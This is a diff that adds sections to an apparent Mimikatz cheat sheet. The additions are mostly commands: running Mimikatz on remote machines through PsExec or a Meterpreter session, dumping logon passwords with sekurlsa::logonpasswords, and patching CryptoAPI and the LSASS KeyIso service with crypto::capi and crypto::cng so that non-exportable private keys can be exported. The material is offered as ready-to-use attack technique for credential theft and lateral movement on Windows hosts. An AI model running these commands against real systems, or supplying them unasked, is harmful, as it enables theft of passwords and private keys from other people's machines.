@@ -464,3 +464,78 @@ Then
 Then
 
        sekurlsa::logonpasswords
+
+## Remote Execution
+
+### Remote execution with Mimikatz enables the execution of Mimikatz commands on remote systems to extract sensitive information such as passwords and credentials.
+
+1) PsExec
+
+       psexec \\REMOTE_COMPUTER_IP_OR_NAME -u USERNAME -p PASSWORD mimikatz.exe MIMIKATZ_COMMAND ARGUMENTS
+
+2) Meterpreter
+
+On a Meterpreter session, load the Mimikatz plugin
+
+       load mimikatz
+
+Execute Mmimikatz commands
+
+       mimikatz_command ARGUMENTS
+
+Example:
+
+       mimikatz_command sekurlsa::logonpasswords
+
+## Crypto Module
+
+### Provides functionality similar to the certutil utility and includes capabilities for token impersonation, patching legacy CryptoAPI functions and modifying the CNG key isolation service.
+
+List of valid system stores and available stores within them
+
+       crypto::stores
+
+Non-exportable keys may often be exported after using
+
+       crypto::capi 
+
+AND/OR
+
+       crypto::cng 
+
+### TIP: Ensure you have the correct ACL on the filesystem to access private keys. Some operations might require elevated privileges (UAC prompts for example)
+
+### TIP 2: Smartcard crypto providers may sometimes falsely report successful private key exports.
+
+1) providers
+
+Lists all available providers, including CryptoAPI and CNG providers if available on NT 6
+
+       crypto::providers
+
+2) capi
+
+Patches a CryptoAPI function within the Mimikatz process to make unexportable keys exportable. Useful for providers such as:
+
+##### 1) Microsoft Base Cryptographic Provider v1.0
+
+##### 2) Microsoft Enhanced Cryptographic Provider v1.0
+
+##### 3) Microsoft Enhanced RSA and AES Cryptographic Provider
+
+##### 4) Microsoft RSA SChannel Cryptographic Provider
+
+##### 5) Microsoft Strong Cryptographic Provider
+
+Usage:
+
+       crypto::capi 
+
+3) CNG
+
+Modifies the KeyIso service in the LSASS process to make unexportable keys exportable. This is specifically useful for the Microsoft Software Key Storage Provider.
+
+       privilege::Debug
+
+       crypto::cng
+
